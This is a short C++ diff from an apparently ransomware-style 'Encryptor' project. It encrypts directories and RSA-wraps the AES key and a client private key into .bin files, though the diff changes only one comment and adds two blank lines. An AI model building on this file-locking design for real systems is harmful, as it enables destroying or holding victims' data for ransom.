@@ -84,7 +84,7 @@ void Encryptor::invokeDir(const std::string &dirPath, bool protection)
 
     }
 
-    // join threads for the bigger file encryption
+    // Join all threads which were spawned for huge file encryption
     joinThreads();
 
     // Save the final AESKey.bin file
@@ -107,6 +107,7 @@ void Encryptor::encryptCPrivateRSA()
         std::string cPrivateRSAEnc = _rsaEncryptorCPrivateRSA->getEncryptedMessage();
         // Save the encrypted CPrivateRSA string to CPrivateRSA.bin
         _rsaEncryptorCPrivateRSA->writeEncMSGToFile(butterfly::ENC_CPRIVATERSA_FILENAME, cPrivateRSAEnc, encMSGLen);
+
     } catch (RSAEncryptionException &e)
     {
         std::cerr << e.what() << std::endl;
@@ -144,6 +145,7 @@ void Encryptor::encryptFinalAESKeyWithRSA(const std::string &aesKeyStr, const st
         std::string aesKeyEnc = _rsaEncryptorAESKey->getEncryptedMessage();
         // Save the encrypted AES Key to AESKey.bin
         _rsaEncryptorAESKey->writeEncMSGToFile(filename, aesKeyEnc, encMSGLen);
+
     } catch (RSAEncryptionException &e)
     {
         std::cerr << e.what() << std::endl;
